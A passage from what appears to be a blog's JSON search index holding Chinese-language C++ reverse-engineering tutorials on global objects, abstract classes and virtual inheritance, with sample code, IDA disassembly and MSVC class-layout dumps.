printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    int  GetAge() const &#123;        return m_nAge;    &#125;    void  SetAge(int nAge) &#123;        m_nAge = nAge;    &#125;private:    char* m_pszName;    int m_nAge;&#125;;int main(int argc, char* argv)&#123;    static CPerson g_pObj(argc);    printf(&quot;Age:%d\\r\\n&quot;, g_pObj.GetAge());    printf(&quot;main end\\n&quot;);    return 0;&#125;\n\n\nmain函数\n\n\n参考链接C++RE02-全局类对象\n","slug":"C++逆向——全局类对象","date":"2023-03-09T13:44:59.000Z","categories_index":"","tags_index":"c++逆向","author_index":"0netry"},{"id":"0eecfedfebb040c00fe24e77372fb210","title":"C++逆向——抽象类与虚继承","content":"抽象类在编码过程中，抽象类的定义需要配合虚函数使用。在虚函数的声明结尾处添加“&#x3D;0”，这种虚函数被称为纯虚函数。纯虚函数是一个没有实现只有声明的函数，它的存在就是为了让类具有抽象类的功能，让继承自抽象类的子类都具有虚表以及虚表指针。在使用过程中，利用抽象类指针可以更好地完成多态的工作。\n纯虚函数的分析12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class AbstractBase &#123;public:\tAbstractBase() &#123;\t\tprintf(&quot;AbstractBase()&quot;);\t&#125;\tvirtual void show() = 0; //定义纯虚函数&#125;;class VirtualChild : public AbstractBase &#123; //定义继承抽象类的子类public:\tvirtual void show() &#123; //实现纯虚函数\t\tprintf(&quot;抽象类分析\\n&quot;);\t&#125;&#125;;int main(int argc, char* argv[]) &#123;\tVirtualChild obj;\tobj.show();\treturn 0;&#125;\n\nida汇编及伪代码视图：\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394.text:004010D0 ; int __cdecl main(int argc, const char **argv, const char **envp).text:004010D0 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:004010D0.text:004010D0 var_8           = byte ptr -8.text:004010D0 var_4           = dword ptr -4.text:004010D0 argc            = dword ptr  8.text:004010D0 argv            = dword ptr  0Ch.text:004010D0 envp            = dword ptr  10h.text:004010D0.text:004010D0                 push    ebp.text:004010D1                 mov     ebp, esp.text:004010D3                 sub     esp, 8.text:004010D6                 mov     eax, ___security_cookie.text:004010DB                 xor     eax, ebp.text:004010DD                 mov     [ebp-4], eax.text:004010E0                 lea     ecx, [ebp-8].text:004010E3                 call    sub_401100      ; 构造函数.text:004010E8                 lea     ecx, [ebp-8]    ; char.text:004010EB                 call    sub_4010B0      ; show函数.text:004010F0                 xor     eax, eax.text:004010F2                 mov     ecx, [ebp-4].text:004010F5                 xor     ecx, ebp        ; StackCookie.text:004010F7                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:004010FC                 mov     esp, ebp.text:004010FE                 pop     ebp.text:004010FF                 retn.text:004010FF _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4[4]; // [esp+0h] [ebp-8h] BYREF  sub_401100(v4);  sub_4010B0((char)v4);  return 0;&#125;//构造函数.text:00401100 ; _DWORD *__thiscall sub_401100(_DWORD *this).text:00401100 sub_401100      proc near               ; CODE XREF: _main+13↑p.text:00401100.text:00401100 var_4           = byte ptr -4.text:00401100.text:00401100                 push    ebp             ; 构造函数.text:00401101                 mov     ebp, esp.text:00401103                 push    ecx.text:00401104                 mov     [ebp-4], ecx.text:00401107                 mov     ecx, [ebp-4]    ; char.text:0040110A                 call    sub_401080      ; 调用父类抽象类AbstractBase构造函数.text:0040110F                 mov     eax, [ebp-4].text:00401112                 mov     dword ptr [eax], offset ??_7VirtualChild@@6B@ ; const VirtualChild::`vftable&#x27;.text:00401118                 mov     eax, [ebp-4].text:0040111B                 mov     esp, ebp.text:0040111D                 pop     ebp.text:0040111E                 retn.text:0040111E sub_401100      endp_DWORD *__thiscall sub_401100(_DWORD *this)&#123;  sub_401080(this);  *this = &amp;VirtualChild::`vftable&#x27;;  return this;&#125;//抽象类AbstractBase构造函数.text:00401080 ; int __fastcall sub_401080(_DWORD *).text:00401080 sub_401080      proc near               ; CODE XREF: sub_401100+A↓p.text:00401080.text:00401080 var_4           = dword ptr -4.text:00401080.text:00401080                 push    ebp             ; 抽象类AbstractBase构造函数.text:00401081                 mov     ebp, esp.text:00401083                 push    ecx             ; char.text:00401084                 mov     [ebp-4], ecx.text:00401087                 mov     eax, [ebp-4].text:0040108A                 mov     dword ptr [eax], offset ??_7AbstractBase@@6B@ ; const AbstractBase::`vftable&#x27;.text:0040108A                                         ; 设置抽象类虚表指针，虚表地址在??_7AbstractBase@@6B@处.text:00401090                 push    offset Format   ; &quot;AbstractBase()&quot;.text:00401095                 call    printf.text:0040109A                 add     esp, 4.text:0040109D                 mov     eax, [ebp+var_4].text:004010A0                 mov     esp, ebp.text:004010A2                 pop     ebp.text:004010A3                 retn.text:004010A3 sub_401080      endpint __fastcall sub_401080(_DWORD *a1)&#123;  int v2; // [esp+0h] [ebp-4h]  *a1 = &amp;AbstractBase::`vftable&#x27;;  printf(&quot;AbstractBase()&quot;, (char)a1);  return v2;&#125;\n\n查看抽象类虚表??_7AbstractBase@@6B@处，虚表信息如下：\n123.rdata:00402130 ; const AbstractBase::`vftable&#x27;.rdata:00402130 ??_7AbstractBase@@6B@ dd offset _purecall.rdata:00402130                                         ; DATA XREF: sub_401080+A↑o\n\n如上面代码所示，在抽象类AbstractBase的虚表信息中，因为纯虚函数没有实现代码，所以没有首地址。编译器为了防止误调用纯虚函数，将虚表中保存的纯虚函数的首地址项替换成函数__purecall，用于结束程序。\n根据这一特性，在分析过程中，一旦在虚表中发现函数地址为__purecall（GCC编译器函数名称为___cxa_pure_virtual）函数的地址时，我们可以高度怀疑此虚表对应的类是一个抽象类。当抽象类中定义了多个纯虚函数时，虚表中将保存相同的函数指针。\n在上面代码中，插入新的纯虚函数并在子类中予以实现。经过编译后，再次查看虚表信息：\n1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class AbstractBase &#123;public:\tAbstractBase() &#123;\t\tprintf(&quot;AbstractBase()&quot;);\t&#125;\tvirtual void show() = 0; //定义纯虚函数\tvirtual void show2() = 0;\tvirtual void show3() = 0;&#125;;class VirtualChild : public AbstractBase &#123; //定义继承抽象类的子类public:\tvirtual void show() &#123; //实现纯虚函数\t\tprintf(&quot;抽象类分析\\n&quot;);\t&#125;\tvirtual void show2() &#123; //实现纯虚函数\t\tprintf(&quot;抽象类分析2\\n&quot;);\t&#125;\tvirtual void show3() &#123; //实现纯虚函数\t\tprintf(&quot;抽象类分析3\\n&quot;);\t&#125;&#125;;int main(int argc, char* argv[]) &#123;\tVirtualChild obj;\tobj.show();\tobj.show2();\tobj.show3();\treturn 0;&#125;\n\n\n\n1234.rdata:00402150 ; const AbstractBase::`vftable&#x27;.rdata:00402150 ??_7AbstractBase@@6B@      dd offset _purecall     ; DATA XREF: sub_401080+A↑o.rdata:00402154                 dd offset _purecall.rdata:00402158                 dd offset _purecall\n\n虚继承菱形继承菱形继承是最复杂的对象结构，菱形结构将单一继承与多重继承进行组合，如下图所示。\n\n在上图中，类D属于多重继承中的子类，其父类为类B和类C，类B和类C拥有同一个父类A。在菱形继承中，一个派生类中保留间接基类的多份同名成员，虽然可以在不同的成员变量中分别存放不同的数据，但大多数情况下这是多余的。这是因为保留多份成员变量不仅占用较多的存储空间，还容易产生命名冲突。为了解决多继承时的命名冲突和冗余数据问题，C++提出了虚继承，使得在派生类中只保留一份间接基类的成员。\n虚继承的内存结构因为菱形继承的内存结构与多重继承一致，所以本节主要介绍虚继承的内存结构\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)//定义家具类，虚基类，等同于类Aclass Furniture &#123;public:\tFurniture() &#123;\t\tprintf(&quot;Furniture::Furniture()\\n&quot;);\t\tprice = 0;\t&#125;\tvirtual ~Furniture() &#123; //家具类的虚析构函数\t\tprintf(&quot;Furniture::~Furniture()\\n&quot;);\t&#125;\tvirtual int getPrice() &#123; //获取家具价格\t\tprintf(&quot;Furniture::getPrice()\\n&quot;);\t\treturn price;\t&#125;;protected:\tint price; //家具类的成员变量&#125;;//定义沙发类，继承自类Furniture，等同于类Bclass Sofa : virtual public Furniture &#123;public:\tSofa() &#123;\t\tprintf(&quot;Sofa::Sofa()\\n&quot;);\t\tprice = 1;\t\tcolor = 2;\t&#125;\tvirtual ~Sofa() &#123; //沙发类虚析构函数\t\tprintf(&quot;Sofa::~Sofa()\\n&quot;);\t&#125;\tvirtual int getColor() &#123; //获取沙发颜色\t\tprintf(&quot;Sofa::getColor()\\n&quot;);\t\treturn color;\t&#125;\tvirtual int sitDown() &#123; //沙发可以坐下休息\t\treturn printf(&quot;Sofa::sitDown()\\n&quot;);\t&#125;protected:\tint color; // 沙发类成员变量&#125;;//定义床类，继承自类Furniture，等同于类Cclass Bed : virtual public Furniture &#123;public:\tBed() &#123;\t\tprintf(&quot;Bed::Bed()\\n&quot;);\t\tprice = 3;\t\tlength = 4;\t\twidth = 5;\t&#125;\tvirtual ~Bed() &#123; //床类的虚析构函数\t\tprintf(&quot;Bed::~Bed()\\n&quot;);\t&#125;\tvirtual int getArea() &#123; //获取床面积\t\tprintf(&quot;Bed::getArea()\\n&quot;);\t\treturn length * width;\t&#125;\tvirtual int sleep() &#123; //床可以用来睡觉\t\treturn printf(&quot;Bed::sleep()\\n&quot;);\t&#125;protected:\tint length; //床类成员变量\tint width;&#125;;//子类沙发床的定义，派生自类Sofa和类Bed，等同于类Dclass SofaBed : public Sofa, public Bed &#123;public:\tSofaBed() &#123;\t\tprintf(&quot;SofaBed::SofaBed()\\n&quot;);\t\theight = 6;\t&#125;\tvirtual ~SofaBed() &#123; //沙发床类的虚析构函数\t\tprintf(&quot;SofaBed::~SofaBed()\\n&quot;);\t&#125;\tvirtual int sitDown() &#123; //沙发可以坐下休息\t\treturn printf(&quot;SofaBed::sitDown()\\n&quot;);\t&#125;\tvirtual int sleep() &#123; //床可以用来睡觉\t\treturn printf(&quot;SofaBed::sleep()\\n&quot;);\t&#125;\tvirtual int getHeight() &#123;\t\tprintf(&quot;SofaBed::getHeight()\\n&quot;);\t\treturn height;\t&#125;protected:\tint height; //沙发类的成员变量&#125;;int main(int argc, char* argv[]) &#123;\tSofaBed sofabed;\treturn 0;&#125;\n\n上面代码中一共定义了4个类，分别为Furniture、Sofa、Bed和SofaBed。Furniture为虚基类，从Furniture类中派生了两个子类：Sofa与Bed，它们在继承时使用了virtual的方式，即虚继承。\n使用虚继承可以避免共同派生出的子类产生多义性错误。那么，为什么virtual要加在两个父类上而不是它们共同派生的子类呢？这个问题与现实世界中动物的繁衍很相似，例如熊猫在繁衍时要避免具有血缘关系的雄性与雌性“近亲繁殖”，因为“近亲繁殖”的结果会使繁殖出的后代出现基因重叠的问题，造成残缺现象。类Bed与类Sofa就如同是一对兄妹，它们的父亲为Furniture，如果类Bed与类Sofa“近亲结合”，生下存在基因问题的SofaBed，就会存在基因重叠问题，因此使用虚继承防止这个问题的发生。\n接下来，让我们看看虚继承结构中子类SofaBed的对象在内存中是如何存放的，如下图所示：\n\n上图显示了SofaBed内存中的信息，初步观察内存中保存的数据可知，有些数据类似地址值。下图对各个地址数据进行了注解。\n\n虽然知道了地址数据的含义，但还是存在一些模糊不清的数据无法理解，如SofaBed虚表指针（新）和虚基类偏移表，它们都又代表着什么呢？下面进行分析。\n关于虚表指针在虚继承中，若存在多重继承，子类虚表指针的个数取决于继承的父类以及虚基类的个数，有几个父类和虚基类便会出现几个虚表指针。但是虚基类的虚表指针不一样。\n首先是以父类的虚函数（非重写虚基类的虚函数）为基础，若子类重写了父类的虚函数，则子类的虚函数表中用重写后的虚函数覆盖掉父类被重写的虚函数，若没重写，则保留父类的虚函数，最后再按顺序填写子类自有的虚函数，若有多个父类，则有多个虚函数表，但只在相对于第一个父类（左数第一个）的虚函数表填写子类自有的虚函数。\n若多个父类具有相同的虚函数（函数名相同、参数相同、返回类型相同）（非重写虚基类的虚函数），则只会在第一个出现该函数的父类的虚函数表填写子类重写后的虚函数，\n最后才是相对于虚基类，若没有子类重写虚基类的虚函数，则虚基类的虚函数表填写的是虚基类的虚函数；若只有父类重写了虚基类的虚函数，则虚基类的虚函数表填写的是父类重写后的虚函数；若子类和父类同时重写了虚基类的虚函数，则虚基类的虚函数表填写的是子类重写后的虚函数；如下面的例子：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)//定义家具类，虚基类，等同于类Aclass Furniture &#123;public:\tFurniture() &#123;\t\tprintf(&quot;Furniture::Furniture()\\n&quot;);\t\tprice = 0;\t&#125;\tvirtual ~Furniture() &#123; //家具类的虚析构函数\t\tprintf(&quot;Furniture::~Furniture()\\n&quot;);\t&#125;\tvirtual int getType() &#123; //获取家具价格\t\treturn printf(&quot;Furniture::getType()\\n&quot;);\t&#125;;\tvirtual int getPrice() &#123; //获取家具价格\t\tprintf(&quot;Furniture::getPrice()\\n&quot;);\t\treturn price;\t&#125;;\tprotected:\tint price; //家具类的成员变量&#125;;//定义沙发类，继承自类Furniture，等同于类Bclass Sofa : virtual public Furniture &#123;public:\tSofa() &#123;\t\tprintf(&quot;Sofa::Sofa()\\n&quot;);\t\tprice = 1;\t\tcolor = 2;\t&#125;\tvirtual ~Sofa() &#123; //沙发类虚析构函数\t\tprintf(&quot;Sofa::~Sofa()\\n&quot;);\t&#125;\tvirtual int getColor() &#123; //获取沙发颜色\t\tprintf(&quot;Sofa::getColor()\\n&quot;);\t\treturn color;\t&#125;\tvirtual int sitDown() &#123; //沙发可以坐下休息\t\treturn printf(&quot;Sofa::sitDown()\\n&quot;);\t&#125;\tvirtual int getPrice() &#123; //获取家具价格\t\tprintf(&quot;Sofa::getPrice()\\n&quot;);\t\treturn price;\t&#125;;protected:\tint color; // 沙发类成员变量&#125;;//定义床类，继承自类Furniture，等同于类Cclass Bed : virtual public Furniture &#123;public:\tBed() &#123;\t\tprintf(&quot;Bed::Bed()\\n&quot;);\t\tprice = 3;\t\tlength = 4;\t\twidth = 5;\t&#125;\tvirtual ~Bed() &#123; //床类的虚析构函数\t\tprintf(&quot;Bed::~Bed()\\n&quot;);\t&#125;\tvirtual int getArea() &#123; //获取床面积\t\tprintf(&quot;Bed::getArea()\\n&quot;);\t\treturn length * width;\t&#125;\tvirtual int sleep() &#123; //床可以用来睡觉\t\treturn printf(&quot;Bed::sleep()\\n&quot;);\t&#125;protected:\tint length; //床类成员变量\tint width;&#125;;//子类沙发床的定义，派生自类Sofa和类Bed，等同于类Dclass SofaBed : public Sofa, public Bed &#123;public:\tSofaBed() &#123;\t\tprintf(&quot;SofaBed::SofaBed()\\n&quot;);\t\theight = 6;\t&#125;\tvirtual ~SofaBed() &#123; //沙发床类的虚析构函数\t\tprintf(&quot;SofaBed::~SofaBed()\\n&quot;);\t&#125;\tvirtual int sitDown() &#123; //沙发可以坐下休息\t\treturn printf(&quot;SofaBed::sitDown()\\n&quot;);\t&#125;\tvirtual int sleep() &#123; //床可以用来睡觉\t\treturn printf(&quot;SofaBed::sleep()\\n&quot;);\t&#125;\tvirtual int getHeight() &#123;\t\tprintf(&quot;SofaBed::getHeight()\\n&quot;);\t\treturn height;\t&#125;\tvirtual int getPrice() &#123; //获取家具价格\t\tprintf(&quot;SofaBed::getPrice()\\n&quot;);\t\treturn price;\t&#125;;protected:\tint height; //沙发类的成员变量&#125;;int main(int argc, char* argv[]) &#123;\tSofaBed sofabed;\treturn 0;&#125;\n\n上面例子中子类SofaBed的内存结构：\n12345678910111213141516171819202122232425262728293031323334353637383940411&gt;class SofaBed\tsize(44):1&gt;\t+---1&gt; 0\t| +--- (base class Sofa)1&gt; 0\t| | &#123;vfptr&#125;1&gt; 4\t| | &#123;vbptr&#125;1&gt; 8\t| | color1&gt;\t| +---1&gt;12\t| +--- (base class Bed)1&gt;12\t| | &#123;vfptr&#125;1&gt;16\t| | &#123;vbptr&#125;1&gt;20\t| | length1&gt;24\t| | width1&gt;\t| +---1&gt;28\t| height1&gt;\t+---1&gt;32\t| (vtordisp for vbase Furniture)1&gt;\t+--- (virtual base Furniture)1&gt;36\t| &#123;vfptr&#125;1&gt;40\t| price1&gt;\t+---1&gt;SofaBed::$vftable@Sofa@:1&gt;\t| &amp;SofaBed_meta1&gt;\t|  01&gt; 0\t| &amp;Sofa::getColor1&gt; 1\t| &amp;SofaBed::sitDown1&gt; 2\t| &amp;SofaBed::getHeight1&gt;SofaBed::$vftable@Bed@:1&gt;\t| -121&gt; 0\t| &amp;Bed::getArea1&gt; 1\t| &amp;SofaBed::sleep1&gt;SofaBed::$vbtable@Sofa@:1&gt; 0\t| -41&gt; 1\t| 32 (SofaBedd(Sofa+4)Furniture)1&gt;SofaBed::$vbtable@Bed@:1&gt; 0\t| -41&gt; 1\t| 20 (SofaBedd(Bed+4)Furniture)1&gt;SofaBed::$vftable@Furniture@:1&gt;\t| -361&gt; 0\t| &amp;(vtordisp) SofaBed::&#123;dtor&#125;1&gt; 1\t| &amp;Furniture::getType1&gt; 2\t| &amp;(vtordisp) SofaBed::getPrice\n\n\n\n虚继承结构的类继承和派生12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)//定义家具类，虚基类，等同于类Aclass Furniture &#123;public:\tFurniture() &#123;\t\tprintf(&quot;Furniture::Furniture()\\n&quot;);\t\tprice = 0;\t&#125;\tvirtual ~Furniture() &#123; //家具类的虚析构函数\t\tprintf(&quot;Furniture::~Furniture()\\n&quot;);\t&#125;\tvirtual int getPrice() &#123; //获取家具价格\t\tprintf(&quot;Furniture::getPrice()\\n&quot;);\t\treturn price;\t&#125;;protected:\tint price; //家具类的成员变量&#125;;//定义沙发类，继承自类Furniture，等同于类Bclass Sofa : virtual public Furniture &#123;public:\tSofa() &#123;\t\tprintf(&quot;Sofa::Sofa()\\n&quot;);\t\tprice = 1;\t\tcolor = 2;\t&#125;\tvirtual ~Sofa() &#123; //沙发类虚析构函数\t\tprintf(&quot;Sofa::~Sofa()\\n&quot;);\t&#125;\tvirtual int getColor() &#123; //获取沙发颜色\t\tprintf(&quot;Sofa::getColor()\\n&quot;);\t\treturn color;\t&#125;\tvirtual int sitDown() &#123; //沙发可以坐下休息\t\treturn printf(&quot;Sofa::sitDown()\\n&quot;);\t&#125;protected:\tint color; // 沙发类成员变量&#125;;//定义床类，继承自类Furniture，等同于类Cclass Bed : virtual public Furniture &#123;public:\tBed() &#123;\t\tprintf(&quot;Bed::Bed()\\n&quot;);\t\tprice = 3;\t\tlength = 4;\t\twidth = 5;\t&#125;\tvirtual ~Bed() &#123; //床类的虚析构函数\t\tprintf(&quot;Bed::~Bed()\\n&quot;);\t&#125;\tvirtual int getArea() &#123; //获取床面积\t\tprintf(&quot;Bed::getArea()\\n&quot;);\t\treturn length * width;\t&#125;\tvirtual int sleep() &#123; //床可以用来睡觉\t\treturn printf(&quot;Bed::sleep()\\n&quot;);\t&#125;protected:\tint length; //床类成员变量\tint width;&#125;;//子类沙发床的定义，派生自类Sofa和类Bed，等同于类Dclass SofaBed : public Sofa, public Bed &#123;public:\tSofaBed() &#123;\t\tprintf(&quot;SofaBed::SofaBed()\\n&quot;);\t\theight = 6;\t&#125;\tvirtual ~SofaBed() &#123; //沙发床类的虚析构函数\t\tprintf(&quot;SofaBed::~SofaBed()\\n&quot;);\t&#125;\tvirtual int sitDown() &#123; //沙发可以坐下休息\t\treturn printf(&quot;SofaBed::sitDown()\\n&quot;);\t&#125;\tvirtual int sleep() &#123; //床可以用来睡觉\t\treturn printf(&quot;SofaBed::sleep()\\n&quot;);\t&#125;\tvirtual int getHeight() &#123;\t\tprintf(&quot;SofaBed::getHeight()\\n&quot;);\t\treturn height;\t&#125;protected:\tint height; //沙发类的成员变量&#125;;//C++源码，加入父类指针的转换代码int main(int argc, char* argv[]) &#123;\tSofaBed sofabed;\tFurniture* p1 = &amp;sofabed; //转换成虚基类指针\tSofa* p2 = &amp;sofabed; //转换成父类指针\tBed* p3 = &amp;sofabed; //转换成父类指针\tprintf(&quot;%p %p %p\\n&quot;, p1, p2, p3);\treturn 0;&#125;\n\nida汇编及伪代码视图\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596//main函数.text:00401650 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401650 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:00401650.text:00401650 var_44          = dword ptr -44h.text:00401650 var_40          = byte ptr -40h.text:00401650 var_3C          = dword ptr -3Ch.text:00401650 var_38          = dword ptr -38h.text:00401650 var_34          = dword ptr -34h.text:00401650 var_30          = dword ptr -30h.text:00401650 var_2C          = byte ptr -2Ch.text:00401650 var_28          = dword ptr -28h.text:00401650 var_4           = dword ptr -4.text:00401650 argc            = dword ptr  8.text:00401650 argv            = dword ptr  0Ch.text:00401650 envp            = dword ptr  10h.text:00401650.text:00401650                 push    ebp.text:00401651                 mov     ebp, esp.text:00401653                 sub     esp, 44h.text:00401656                 mov     eax, ___security_cookie.text:0040165B                 xor     eax, ebp.text:0040165D                 mov     [ebp-4], eax.text:00401660                 push    1               ; 是否构造虚基类的标志：1构造，0不构造.text:00401662                 lea     ecx, [ebp-2Ch]  ; 传入对象的首地址作为this指针.text:00401665                 call    sub_401440      ; 调用构造函数.text:0040166A                 lea     eax, [ebp-2Ch]  ; 获取对象的首地址.text:0040166D                 test    eax, eax.text:0040166F                 jnz     short loc_40167A ; 检查代码.text:00401671                 mov     dword ptr [ebp-30h], 0.text:00401678                 jmp     short loc_401687.text:0040167A ; ---------------------------------------------------------------------------.text:0040167A.text:0040167A loc_40167A:                             ; CODE XREF: _main+1F↑j.text:0040167A                 mov     ecx, [ebp-28h]  ; 取对象中的Sofa类虚基类偏移表指针（[ebp-28h]=[ebp-2Ch+4]）.text:0040167D                 mov     edx, [ecx+4]    ; 取出虚基类偏移值并存入edx.text:00401680                 lea     eax, [ebp+edx-28h] ; 根据虚基类偏移表，得到虚基类Furniture的首地址.text:00401684                 mov     [ebp-30h], eax  ; 利用中间变量保存虚基类Furniture的首地址.text:00401687.text:00401687 loc_401687:                             ; CODE XREF: _main+28↑j.text:00401687                 mov     ecx, [ebp-30h].text:0040168A                 mov     [ebp-40h], ecx  ; p1=&amp;sofabed.text:0040168D                 lea     edx, [ebp-2Ch]  ; 直接转换SofaBed对象的首地址为父类Sofa的指针.text:00401690                 mov     [ebp-3Ch], edx  ; p2=&amp;sofabed.text:00401693                 lea     eax, [ebp-2Ch]  ; 获取对象SofaBed的首地址.text:00401696                 test    eax, eax.text:00401698                 jz      short loc_4016A5 ; 地址检查.text:0040169A                 lea     ecx, [ebp-2Ch].text:0040169D                 add     ecx, 0Ch        ; 获取Bed类对象的首地址.text:004016A0                 mov     [ebp-34h], ecx  ; 利用中间变量保存Bed类对象的首地址.text:004016A3                 jmp     short loc_4016AC.text:004016A5 ; ---------------------------------------------------------------------------.text:004016A5.text:004016A5 loc_4016A5:                             ; CODE XREF: _main+48↑j.text:004016A5                 mov     dword ptr [ebp-34h], 0.text:004016AC.text:004016AC loc_4016AC:                             ; CODE XREF: _main+53↑j.text:004016AC                 mov     edx, [ebp-34h].text:004016AF                 mov     [ebp-38h], edx  ; p3=&amp;sofabed.text:004016B2                 mov     eax, [ebp-38h].text:004016B5                 push    eax             ; 参数4：p3.text:004016B6                 mov     ecx, [ebp-3Ch].text:004016B9                 push    ecx             ; 参数3：p2.text:004016BA                 mov     edx, [ebp-40h].text:004016BD                 push    edx             ; 参数2：p1.text:004016BE                 push    offset aPPP     ; &quot;%p %p %p\\n&quot;.text:004016C3                 call    printf.text:004016C8                 add     esp, 10h.text:004016CB                 mov     dword ptr [ebp-44h], 0.text:004016D2                 lea     ecx, [ebp-2Ch]  ; 传递this指针.text:004016D5                 call    ??_D?$basic_iostream@DU?$char_traits@D@std@@@std@@QAEXXZ ; std::iostream::`vbase destructor&#x27;(void).text:004016D5                                         ; 调用析构代理函数.text:004016DA                 mov     eax, [ebp-44h].text:004016DD                 mov     ecx, [ebp-4].text:004016E0                 xor     ecx, ebp        ; StackCookie.text:004016E2                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:004016E7                 mov     esp, ebp.text:004016E9                 pop     ebp.text:004016EA                 retn.text:004016EA _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char *v4; // [esp+14h] [ebp-30h]  char v5[4]; // [esp+18h] [ebp-2Ch] BYREF  int v6[9]; // [esp+1Ch] [ebp-28h] BYREF  sub_401440(1);  if ( v5 )    v4 = (char *)v6 + *(_DWORD *)(v6[0] + 4);  else    LOBYTE(v4) = 0;  printf(&quot;%p %p %p\\n&quot;, (char)v4);  std::iostream::`vbase destructor&#x27;(v5);  return 0;&#125;\n\n此时各类的结构如下：\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261&gt;class Furniture\tsize(8):1&gt;\t+---1&gt; 0\t| &#123;vfptr&#125;1&gt; 4\t| price1&gt;\t+---1&gt;Furniture::$vftable@:1&gt;\t| &amp;Furniture_meta1&gt;\t|  01&gt; 0\t| &amp;Furniture::&#123;dtor&#125;1&gt; 1\t| &amp;Furniture::getPrice1&gt;Furniture::&#123;dtor&#125; this adjustor: 01&gt;Furniture::getPrice this adjustor: 01&gt;Furniture::__delDtor this adjustor: 01&gt;Furniture::__vecDelDtor this adjustor: 01&gt;class Sofa\tsize(20):1&gt;\t+---1&gt; 0\t| &#123;vfptr&#125;1&gt; 4\t| &#123;vbptr&#125;1&gt; 8\t| color1&gt;\t+---1&gt;\t+--- (virtual base Furniture)1&gt;12\t| &#123;vfptr&#125;1&gt;16\t| price1&gt;\t+---1&gt;Sofa::$vftable@Sofa@:1&gt;\t| &amp;Sofa_meta1&gt;\t|  01&gt; 0\t| &amp;Sofa::getColor1&gt; 1\t| &amp;Sofa::sitDown1&gt;Sofa::$vbtable@:1&gt; 0\t| -41&gt; 1\t| 8 (Sofad(Sofa+4)Furniture)1&gt;Sofa::$vftable@Furniture@:1&gt;\t| -121&gt; 0\t| &amp;Sofa::&#123;dtor&#125;1&gt; 1\t| &amp;Furniture::getPrice1&gt;Sofa::&#123;dtor&#125; this adjustor: 121&gt;Sofa::getColor this adjustor: 01&gt;Sofa::sitDown this adjustor: 01&gt;Sofa::__delDtor this adjustor: 121&gt;Sofa::__vecDelDtor this adjustor: 121&gt;vbi:\t   class  offset o.vbptr  o.vbte fVtorDisp1&gt;       Furniture      12       4       4 01&gt;class Bed\tsize(24):1&gt;\t+---1&gt; 0\t| &#123;vfptr&#125;1&gt; 4\t| &#123;vbptr&#125;1&gt; 8\t| length1&gt;12\t| width1&gt;\t+---1&gt;\t+--- (virtual base Furniture)1&gt;16\t| &#123;vfptr&#125;1&gt;20\t| price1&gt;\t+---1&gt;Bed::$vftable@Bed@:1&gt;\t| &amp;Bed_meta1&gt;\t|  01&gt; 0\t| &amp;Bed::getArea1&gt; 1\t| &amp;Bed::sleep1&gt;Bed::$vbtable@:1&gt; 0\t| -41&gt; 1\t| 12 (Bedd(Bed+4)Furniture)1&gt;Bed::$vftable@Furniture@:1&gt;\t| -161&gt; 0\t| &amp;Bed::&#123;dtor&#125;1&gt; 1\t| &amp;Furniture::getPrice1&gt;Bed::&#123;dtor&#125; this adjustor: 161&gt;Bed::getArea this adjustor: 01&gt;Bed::sleep this adjustor: 01&gt;Bed::__delDtor this adjustor: 161&gt;Bed::__vecDelDtor this adjustor: 161&gt;vbi:\t   class  offset o.vbptr  o.vbte fVtorDisp1&gt;       Furniture      16       4       4 01&gt;class SofaBed\tsize(40):1&gt;\t+---1&gt; 0\t| +--- (base class Sofa)1&gt; 0\t| | &#123;vfptr&#125;1&gt; 4\t| | &#123;vbptr&#125;1&gt; 8\t| | color1&gt;\t| +---1&gt;12\t| +--- (base class Bed)1&gt;12\t| | &#123;vfptr&#125;1&gt;16\t| | &#123;vbptr&#125;1&gt;20\t| | length1&gt;24\t| | width1&gt;\t| +---1&gt;28\t| height1&gt;\t+---1&gt;\t+--- (virtual base Furniture)1&gt;32\t| &#123;vfptr&#125;1&gt;36\t| price1&gt;\t+---1&gt;SofaBed::$vftable@Sofa@:1&gt;\t| &amp;SofaBed_meta1&gt;\t|  01&gt; 0\t| &amp;Sofa::getColor1&gt; 1\t| &amp;SofaBed::sitDown1&gt; 2\t| &amp;SofaBed::getHeight1&gt;SofaBed::$vftable@Bed@:1&gt;\t| -121&gt; 0\t| &amp;Bed::getArea1&gt; 1\t| &amp;SofaBed::sleep1&gt;SofaBed::$vbtable@Sofa@:1&gt; 0\t| -41&gt; 1\t| 28 (SofaBedd(Sofa+4)Furniture)1&gt;SofaBed::$vbtable@Bed@:1&gt; 0\t| -41&gt; 1\t| 16 (SofaBedd(Bed+4)Furniture)1&gt;SofaBed::$vftable@Furniture@:1&gt;\t| -321&gt; 0\t| &amp;SofaBed::&#123;dtor&#125;1&gt; 1\t| &amp;Furniture::getPrice1&gt;SofaBed::&#123;dtor&#125; this adjustor: 321&gt;SofaBed::sitDown this adjustor: 01&gt;SofaBed::sleep this adjustor: 121&gt;SofaBed::getHeight this adjustor: 